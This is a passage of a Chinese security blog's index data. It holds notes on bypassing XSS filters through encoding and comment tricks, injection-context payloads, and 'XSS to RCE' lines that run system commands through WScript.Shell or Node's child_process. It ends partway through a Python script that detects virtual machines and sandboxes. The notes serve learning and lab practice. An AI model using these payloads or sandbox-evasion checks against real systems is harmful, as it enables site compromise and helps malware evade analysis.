class=\"hljs html\"><span class=\"hljs-symbol\">&amp;#160;</span><span class=\"hljs-symbol\">&amp;#106;</span><span class=\"hljs-symbol\">&amp;#97;</span><span class=\"hljs-symbol\">&amp;#118;</span><span class=\"hljs-symbol\">&amp;#97;</span><span class=\"hljs-symbol\">&amp;#115;</span><span class=\"hljs-symbol\">&amp;#99;</span><span class=\"hljs-symbol\">&amp;#114;</span><span class=\"hljs-symbol\">&amp;#105;</span><span class=\"hljs-symbol\">&amp;#112;</span><span class=\"hljs-symbol\">&amp;#116;</span><span class=\"hljs-symbol\">&amp;#58;</span><span class=\"hljs-symbol\">&amp;#97;</span><span class=\"hljs-symbol\">&amp;#108;</span><span class=\"hljs-symbol\">&amp;#101;</span><span class=\"hljs-symbol\">&amp;#114;</span><span class=\"hljs-symbol\">&amp;#116;</span><span class=\"hljs-symbol\">&amp;#40;</span><span class=\"hljs-symbol\">&amp;#41;</span><br></code></pre></td></tr></table></figure>\n\n<p>绕过黑名单过滤</p>\n<h3 id=\"注释白名单绕过\"><a href=\"#注释白名单绕过\" class=\"headerlink\" title=\"注释白名单绕过\"></a>注释白名单绕过</h3><p>依旧是xss-labs里面的一道题，就是上面讲的那一道的后面一道，不仅有javascript字符串的黑名单过滤，还有对于网址的白名单过滤—-如果字符串中没有http:&#x2F;&#x2F;这个字符串，就过滤掉</p>\n<p>这个的绕过方式很简单，就是利用注释，讲http:&#x2F;&#x2F;注释掉即可：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-symbol\">&amp;#160;</span><span class=\"hljs-symbol\">&amp;#106;</span><span class=\"hljs-symbol\">&amp;#97;</span><span class=\"hljs-symbol\">&amp;#118;</span><span class=\"hljs-symbol\">&amp;#97;</span><span class=\"hljs-symbol\">&amp;#115;</span><span class=\"hljs-symbol\">&amp;#99;</span><span class=\"hljs-symbol\">&amp;#114;</span><span class=\"hljs-symbol\">&amp;#105;</span><span class=\"hljs-symbol\">&amp;#112;</span><span class=\"hljs-symbol\">&amp;#116;</span><span class=\"hljs-symbol\">&amp;#58;</span><span class=\"hljs-symbol\">&amp;#97;</span><span class=\"hljs-symbol\">&amp;#108;</span><span class=\"hljs-symbol\">&amp;#101;</span><span class=\"hljs-symbol\">&amp;#114;</span><span class=\"hljs-symbol\">&amp;#116;</span><span class=\"hljs-symbol\">&amp;#40;</span><span class=\"hljs-symbol\">&amp;#41;</span> /* http:// */<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"其它字符混淆\"><a href=\"#其它字符混淆\" class=\"headerlink\" title=\"其它字符混淆\"></a>其它字符混淆</h3><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子<br>可利用注释、标签的优先级等</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">&lt;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-string\">&quot;xss&quot;</span>);<span class=\"hljs-comment\">//&lt;</span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>&lt;scri<span class=\"hljs-comment\">&lt;!--test--&gt;</span>pt&gt;alert(&quot;hello world!&quot;)&lt;/scri<span class=\"hljs-comment\">&lt;!--test--&gt;</span>pt&gt;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"编码绕过\"><a href=\"#编码绕过\" class=\"headerlink\" title=\"编码绕过\"></a>编码绕过</h3><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">unicode编码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;<span class=\"hljs-symbol\">&amp;#97;</span><span class=\"hljs-symbol\">&amp;#108;</span><span class=\"hljs-symbol\">&amp;#101;</span><span class=\"hljs-symbol\">&amp;#114;</span><span class=\"hljs-symbol\">&amp;#116;</span><span class=\"hljs-symbol\">&amp;#40;</span><span class=\"hljs-symbol\">&amp;#34;</span><span class=\"hljs-symbol\">&amp;#120;</span><span class=\"hljs-symbol\">&amp;#115;</span><span class=\"hljs-symbol\">&amp;#115;</span><span class=\"hljs-symbol\">&amp;#34;</span><span class=\"hljs-symbol\">&amp;#41;</span><span class=\"hljs-symbol\">&amp;#59;</span>&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(&#x27;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0078\\u0073\\u0073\\u0022\\u0029\\u003b&#x27;)&quot;</span>&gt;</span><br>url编码绕过<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span><br>Ascii码绕过<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span><br>Hex绕过<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">eval(</span>&#x27;\\<span class=\"hljs-attr\">x61</span>\\<span class=\"hljs-attr\">x6c</span>\\<span class=\"hljs-attr\">x65</span>\\<span class=\"hljs-attr\">x72</span>\\<span class=\"hljs-attr\">x74</span>\\<span class=\"hljs-attr\">x28</span>\\<span class=\"hljs-attr\">x27</span>\\<span class=\"hljs-attr\">x78</span>\\<span class=\"hljs-attr\">x73</span>\\<span class=\"hljs-attr\">x73</span>\\<span class=\"hljs-attr\">x27</span>\\<span class=\"hljs-attr\">x29</span>&#x27;)&gt;</span><br>八进制绕过<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(</span>&#x27;\\<span class=\"hljs-attr\">170</span>\\<span class=\"hljs-attr\">163</span>\\<span class=\"hljs-attr\">163</span>&#x27;)&gt;</span><br>base64绕过<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">// 十进制<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;</span>&gt;</span>test<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><br>// 十六进制<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;</span>&gt;</span>test<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><br>// 也可以不带分号<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29</span>&gt;</span>test<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>同样可用混合编码绕过：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">混合编码就是对一个XSS向量同时进行多种编码，如下示例：<br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">javascript:alert(</span>&quot;<span class=\"hljs-attr\">xss</span>&quot;)&gt;</span>test<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>// 对javascript:进行HTML编码, 对alert(&quot;xss&quot;)进行URL编码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;%61%6c%65%72%74%28%22%78%73%73%22%29</span>&gt;</span>test<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><br>// 对javascript:进行HTML编码, 对alert进行Unicode编码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;\\u0061\\u006C\\u0065\\u0072\\u0074(</span>&quot;<span class=\"hljs-attr\">xss</span>&quot;)&gt;</span>test<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"绕过url过滤\"><a href=\"#绕过url过滤\" class=\"headerlink\" title=\"绕过url过滤\"></a>绕过url过滤</h2><p>使用url编码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=``<span class=\"hljs-attr\">http:</span>//%<span class=\"hljs-attr\">77</span>%<span class=\"hljs-attr\">77</span>%<span class=\"hljs-attr\">77</span>%<span class=\"hljs-attr\">2e</span>%<span class=\"hljs-attr\">62</span>%<span class=\"hljs-attr\">61</span>%<span class=\"hljs-attr\">69</span>%<span class=\"hljs-attr\">64</span>%<span class=\"hljs-attr\">75</span>%<span class=\"hljs-attr\">2e</span>%<span class=\"hljs-attr\">63</span>%<span class=\"hljs-attr\">6f</span>%<span class=\"hljs-attr\">6d</span>/``&gt;</span><br>使用IP<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=``<span class=\"hljs-attr\">http:</span>//<span class=\"hljs-attr\">2130706433</span>/``&gt;</span>十进制<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=``<span class=\"hljs-attr\">http:</span>//<span class=\"hljs-attr\">0177.0.0.01</span>/``&gt;</span>八进制<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=``<span class=\"hljs-attr\">http:</span>//<span class=\"hljs-attr\">0x7f.0x0.0x0.0x1</span>/``&gt;</span>十六进制<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=``//<span class=\"hljs-attr\">www.baidu.com</span>``&gt;</span>html标签中用//可以代替http://<br>使用\\ (注意：在windows下\\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议)<br>使用中文逗号代替英文逗号<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;document.location=``http://www。baidu。com``&quot;</span>&gt;</span>//会自动跳转到百度<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"XSS-输出点总结\"><a href=\"#XSS-输出点总结\" class=\"headerlink\" title=\"XSS 输出点总结\"></a>XSS 输出点总结</h1><p>WAF最大的问题，在于不知道输出的位置，导致攻击者根据具体环境以及具体输出的标签类型便可以绕过。</p>\n<h2 id=\"输出在属性里\"><a href=\"#输出在属性里\" class=\"headerlink\" title=\"输出在属性里\"></a>输出在属性里</h2><p>例如输出的位置位于value属性中：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;[输出]&quot;</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">text</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>我们可以选择直接闭合标签：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">&quot;&gt;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span><br><br>// 输出后如下:<br>// <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span>&quot; type=text&gt;<br></code></pre></td></tr></table></figure>\n\n<p>如果 <code>&lt; &gt;</code> 被过滤的话可以换成选择使用事件来闭合属性，并将后面的引号注释掉或闭合：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">&quot; autofocus onfocus=alert(1)//<br>&quot; autofocus onfocus=alert(1) &quot;<br><br>// 输出后如下:<br>// <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;&quot;</span> <span class=\"hljs-attr\">autofocus</span> <span class=\"hljs-attr\">onfocus</span>=<span class=\"hljs-string\">alert(1)//</span>&quot; <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">text</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>同样还有很多其他的payload：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-string\">&quot; onmouseover=prompt(0) x=&quot;</span><br><span class=\"hljs-string\">&quot; onfocusin=alert(1) autofocus x=&quot;</span><br><span class=\"hljs-string\">&quot; onfocusout=alert(1) autofocus x=&quot;</span><br><span class=\"hljs-string\">&quot; onblur=alert(1) autofocus a=&quot;</span><br></code></pre></td></tr></table></figure>\n\n<p>还有一些特殊的场景，如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;hidden&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;[输出]&quot;</span> /&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;[输出点]&quot;</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;hidden&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>这里只能把input标签闭合，然后直接执行脚本，否则会因为type为hidden导致无法执行脚本。</p>\n<h2 id=\"输出在HTML标签之间\"><a href=\"#输出在HTML标签之间\" class=\"headerlink\" title=\"输出在HTML标签之间\"></a>输出在HTML标签之间</h2><p>例如输出的位置如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;body&quot;</span>&gt;</span>[输出]<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>直接提交 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 即可触发XSS，但是当标签是不能执行脚本的标签时，如下面这几个：</p>\n<ul>\n<li><code>&lt;title&gt;&lt;/title&gt;</code></li>\n<li><code>&lt;textarea&gt;&lt;/textarea&gt;</code></li>\n<li><code>&lt;xmp&gt;&lt;/xmp&gt;</code></li>\n<li><code>&lt;iframe&gt;&lt;/iframe&gt;</code></li>\n</ul>\n<p>那么就得先把那个标签闭合（后文会讲到原理），然后在注入XSS语句，例如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">textarea</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"输出在script标签之间\"><a href=\"#输出在script标签之间\" class=\"headerlink\" title=\"输出在script标签之间\"></a>输出在script标签之间</h2><p>例如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-keyword\">var</span> x = <span class=\"hljs-string\">&quot;input&quot;</span>;</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>可控位置在input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">&quot;;alert(1)//<br><br>// 输出后如下:<br>// <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-keyword\">var</span> x = <span class=\"hljs-string\">&quot;&quot;</span>;<span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-number\">1</span>)<span class=\"hljs-comment\">//&quot;;</span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"XSS-to-RCE\"><a href=\"#XSS-to-RCE\" class=\"headerlink\" title=\"XSS to RCE\"></a>XSS to RCE</h1><p>为了大大提升 XSS 的危害，我们可以利用 JavaScript 来执行系统命令。</p>\n<h2 id=\"使用-WScript-Shell-执行系统命令\"><a href=\"#使用-WScript-Shell-执行系统命令\" class=\"headerlink\" title=\"使用 WScript.Shell 执行系统命令\"></a>使用 WScript.Shell 执行系统命令</h2><p>WScript.Shell（Windows Script Host Runtime Library）是一个对象，对应的文件是C:&#x2F;WINDOWS&#x2F;system32&#x2F;wshom.ocx，Wscript.shell是服务器系统会用到的一种组件。4这个对象可以执行操作系统外壳常用的操作，比如运行程序、读写注册表、环境变量等。简单使用如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">var shell = new ActiveXObject(&quot;WScript.Shell&quot;);<br>shell.run(&quot;calc.exe&quot;);<br></code></pre></td></tr></table></figure>\n\n<p>有时候为了 Bypass 也可以使用 <code>String.fromCharCode</code> 从 Ascii 来转化恶意代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;img src=x onerror=&quot;eval(String.fromCharCode(10,118,97,114,32,111,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,115,104,101,108,108,39,41,59,10,111,46,114,117,110,40,39,99,97,108,99,46,101,120,101,39,41,59,10));&quot;&gt;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"使用-child-process-执行系统命令\"><a href=\"#使用-child-process-执行系统命令\" class=\"headerlink\" title=\"使用 child_process 执行系统命令\"></a>使用 child_process 执行系统命令</h2><p>如果目标环境启用了 NodeJS 的话，我们也可以利用 NodeJS 的子进程（child_process）调用并执行系统命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;img src=x onerror=&quot;const exec = require(&#x27;child_process&#x27;).exec;exec(&#x27;whoami&#x27;).stdout.on(&#x27;data&#x27;, function (data) &#123;alert(data);&#125;)&quot;&gt;<br><br>&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;&gt;<br><br>&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;&lt;更多稀奇古怪的Payload&gt;&#x27;);&quot;&gt;<br></code></pre></td></tr></table></figure>\n\n<p>能执行系统命令了，那么 XSS 在钓鱼攻击中的作用便大大提高了，我们完全可以利用 XSS 反弹 Shell 并上线 Metasploit 或 CS 。请继续往下看。</p>\n<hr>\n<p>后面一段xmind的xss漏洞到rce的暂时先不放了，有兴趣的自己去文章里面去看</p>\n<h1 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h1><p>这一整篇文章都是结合了以下两位师傅的文章：</p>\n<blockquote>\n<p><a href=\"https://xz.aliyun.com/t/9606\">https://xz.aliyun.com/t/9606</a></p>\n<p><a href=\"https://blog.csdn.net/LYJ20010728/article/details/116462782\">https://blog.csdn.net/LYJ20010728/article/details/116462782</a></p>\n</blockquote>\n<p>这两位师傅写的实在是太详尽了</p>\n","categories":["Note"],"tags":["xss"]},{"title":"python检测沙箱及虚拟机","url":"/2023/03/25/python%E6%A3%80%E6%B5%8B%E8%99%9A%E6%8B%9F%E6%9C%BA&%E6%B2%99%E7%AE%B1/","content":"<h1 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h1><p>虚拟机不是日常使用的电脑，所以肯定有很大的不同</p>\n<p>例如，虚拟机有一些文件是物理机没有的</p>\n<p>或者说，虚拟机的运行配置特别的低</p>\n<p>那么这就是一个不错的思路</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><p>这个代码只针对于普遍的VMware虚拟机以及普通的沙箱</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> os<br><span class=\"hljs-keyword\">import</span> shutil<br><span class=\"hljs-keyword\">from</span> psutil <span class=\"hljs-keyword\">import</span> boot_time<br><span class=\"hljs-keyword\">from</span> time <span class=\"hljs-keyword\">import</span> sleep, time<br><span class=\"hljs-keyword\">from</span> ping3 <span class=\"hljs-keyword\">import</span> ping<br><br><br>host = <span class=\"hljs-string\">&#x27;baidu.com&#x27;</span><br><br>src_addr = <span class=\"hljs-literal\">None</span><br>res = <span class=\"hljs-number\">0</span><br><br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">ping_some_ip</span>(<span class=\"hljs-params\">host, src_addr=<span class=\"hljs-literal\">None</span></span>):<br>    second = ping(host, src_addr=src_addr)<br>    <span class=\"hljs-keyword\">return</span> second<br><br><br><span class=\"hljs-keyword\">while</span> res &lt;= <span class=\"hljs-number\">3</span>:<br>    result = ping_some_ip(host, src_addr)<br>    <span class=\"hljs-keyword\">if</span> result <span class=\"hljs-keyword\">is</span> <span class=\"hljs-literal\">None</span>:<br>        res = res + <span class=\"hljs-number\">1</span><br>        <span class=\"hljs-keyword\">break</span><br>    <span class=\"hljs-keyword\">else</span>:<br>        exit()<br>count = os.cpu_count()<br><br>bootTime = (time() - boot_time()) / <span class=\"hljs-number\">3600</span><br>total_size = shutil.disk_usage(<span class=\"hljs-string\">&quot;C:\\\\&quot;</span>).total<br>total_size = total_size / (<span class=\"hljs-number\">1024</span> * <span class=\"hljs-number\">1024</span>)<br>file_1 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\Drivers\\Vmmouse.sys&quot;</span>)<br>file_2 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\Drivers\\vmtray.dll&quot;</span>)<br>file_3 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\Drivers\\VMToolsHook.dll&quot;</span>)<br>file_4 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\Drivers\\vmmousever.dll&quot;</span>)<br>file_5 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\Drivers\\vmhgfs.dll&quot;</span>)<br>file_6 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\Drivers\\vmGuestLib.dll&quot;</span>)<br>file_7 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\Drivers\\VBoxMouse.sys&quot;</span>)<br>file_8 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\Drivers\\VBoxGuest.sys&quot;</span>)<br>file_9 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\Drivers\\VBoxSF.sys&quot;</span>)<br>file_10 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\Drivers\\VBoxVideo.sys&quot;</span>)<br>file_11 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\vboxdisp.dll&quot;</span>)<br>file_12 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\vboxhook.dll&quot;</span>)<br>file_13 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\vboxoglerrorspu.dll&quot;</span>)<br>file_14 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\vboxoglpassthroughspu.dll&quot;</span>)<br>file_15 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\vboxservice.exe&quot;</span>)<br>file_16 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\vboxtray.exe&quot;</span>)<br>file_17 = os.path.exists(<span class=\"hljs-string\">r&quot;C:\\windows\\System32\\VBoxControl.exe&quot;</span>)<br><br><span class=\"hljs-keyword\">if</span> file_1 <span class=\"hljs-keyword\">or</span> file_2 <span class=\"hljs-keyword\">or</span> file_17 <span class=\"hljs-keyword\">or</span> file_16 <span class=\"hljs-keyword\">or</span> file_15 <span class=\"hljs-keyword\">or</span> file_14 <span class=\"hljs-keyword\">or</span> file_13 <span class=\"hljs-keyword\">or</span> file_12 <span class=\"hljs-keyword\">or</span> file_11 <span class=\"hljs-keyword\">or</span> file_9 <span class=\"hljs-keyword\">or</span> file_8 <span class=\"hljs-keyword\">or</span> file_10 <span class=\"hljs-keyword\">or</span> file_7 <span class=\"hljs-keyword\">or</span> file_6 <span class=\"hljs-keyword\">or</span> file_5 <span class=\"hljs-keyword\">or</span> file_4 <span class=\"hljs-keyword\">or</span> 